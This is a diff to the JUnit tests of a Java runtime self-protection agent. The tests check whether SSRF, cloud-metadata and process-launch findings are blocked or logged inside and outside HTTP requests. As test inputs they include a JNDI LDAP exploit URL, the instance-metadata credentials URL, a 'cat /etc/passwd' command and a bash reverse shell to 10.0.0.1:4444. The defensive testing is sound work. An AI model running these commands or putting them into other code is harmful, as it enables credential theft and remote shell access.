@@ -18,8 +18,8 @@ import org.junit.jupiter.api.io.TempDir;
 
 /**
  * Block scope on the primary, as on the backports (Java8OutsideRequestTest there): a finding with request evidence
- * blocks wherever it runs; outside a request an intrinsic finding blocks whatever {@code outside_request} says, an
- * operation-only finding logs whatever it says, and a context-dependent one follows it (block by default).
+ * blocks wherever it runs; outside a request an intrinsic finding blocks whatever {@code outside_request} says, a
+ * request-only finding logs whatever it says, and a context-dependent one follows it (block by default).
  */
 final class OutsideRequestTest {
   private static final String LDAP = "ldap://127.0.0.1:1/Exploit";
@@ -59,21 +59,82 @@ final class OutsideRequestTest {
   }
 
   /**
-   * A cloud SDK reads instance metadata at start-up, a job fetches an ftp: URL: outside a request these log whatever
-   * the setting says; inside one they block.
+   * The cloud metadata address outside a request follows the setting, as the backports decided on main: it blocks by
+   * default and logs under log only. An ftp: URL a job fetches is one of the primary's request-only SSRF rules: it
+   * logs outside a request whatever the setting says. Inside a request both block.
    */
   @Test
-  void anOperationOnlyFindingLogsOutsideARequestAndBlocksInsideOne() throws Exception {
+  void theMetadataAddressFollowsTheSettingAndARequestOnlyRuleLogsOutsideARequest() throws Exception {
     assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\"}"));
 
+    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeUrlOpen(URI.create(METADATA).toURL()));
     assertDoesNotThrow(() -> OhMyRaspHooks.beforeUrlOpen(URI.create("ftp://127.0.0.1:1/report.csv").toURL()));
+    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
     assertDoesNotThrow(() -> OhMyRaspHooks.beforeUrlOpen(URI.create(METADATA).toURL()));
     OhMyRaspHooks.enterHttpRequest(new ReportRequest(), new Object());
     try {
       assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeUrlOpen(URI.create(METADATA).toURL()));
+      assertThrows(OhMyRaspBlockException.class,
+          () -> OhMyRaspHooks.beforeUrlOpen(URI.create("ftp://127.0.0.1:1/report.csv").toURL()));
     } finally {
       OhMyRaspHooks.exitHttpRequest();
     }
+  }
+
+  /**
+   * A cloud provider's own credential client reading the metadata address outside a request is logged, not blocked
+   * (here a stand-in with the AWS SDK 2.x class name, which is also the documented trust boundary: the name is the
+   * evidence). The same read by application code blocks; inside a request the SDK's read blocks too.
+   */
+  @Test
+  void aCloudSdkCredentialClientReadingMetadataOutsideARequestLogs() throws Exception {
+    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\"}"));
+    java.net.URL credentials = URI.create("http://169.254.169.254/latest/meta-data/iam/security-credentials/").toURL();
+
+    assertDoesNotThrow(() -> software.amazon.awssdk.auth.credentials.InstanceProfileCredentialsProvider.read(credentials));
+    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeUrlOpen(credentials));
+    OhMyRaspHooks.enterHttpRequest(new ReportRequest(), new Object());
+    try {
+      assertThrows(OhMyRaspBlockException.class,
+          () -> software.amazon.awssdk.auth.credentials.InstanceProfileCredentialsProvider.read(credentials));
+    } finally {
+      OhMyRaspHooks.exitHttpRequest();
+    }
+  }
+
+  /**
+   * An exchange with no captured origin that runs on a thread serving a request is inside that request: the active
+   * request is the fallback, as on the backports. With log only, the metadata destination still blocks there.
+   */
+  @Test
+  void anExchangeWithoutACapturedOriginOnARequestThreadIsInsideThatRequest() {
+    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
+    URI metadata = URI.create(METADATA);
+    OhMyRaspHooks.enterHttpRequest(new ReportRequest(), new Object());
+    try {
+      assertThrows(OhMyRaspBlockException.class,
+          () -> OhMyRaspHooks.beforeHttpExchange(new Object(), new Object(), metadata));
+    } finally {
+      OhMyRaspHooks.exitHttpRequest();
+    }
+    assertDoesNotThrow(() -> OhMyRaspHooks.beforeHttpExchange(new Object(), new Object(), metadata));
+  }
+
+  /**
+   * Under log only, a launch that a Groovy script or Solr's configured listener makes is still stopped when its
+   * arguments are an exploit's: the intrinsic finding is not hidden by the context-dependent one.
+   */
+  @Test
+  void anExploitShapedLaunchUnderAScriptEngineBlocksWithLogOnly() {
+    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
+    var groovy = java.util.List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods");
+    var solr = java.util.List.of("org.apache.solr.core.RunExecutableListener");
+
+    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeProcessBuilderStart(
+        new ProcessBuilder("sh", "-c", "cat /etc/passwd"), groovy));
+    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeProcessBuilderStart(
+        new ProcessBuilder("bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), solr));
+    assertDoesNotThrow(() -> OhMyRaspHooks.beforeProcessBuilderStart(new ProcessBuilder("ls", "-l"), groovy));
   }
 
   /** The YARN handler holds the HTTP request: a denial is inside a request with no servlet frame tracked. */
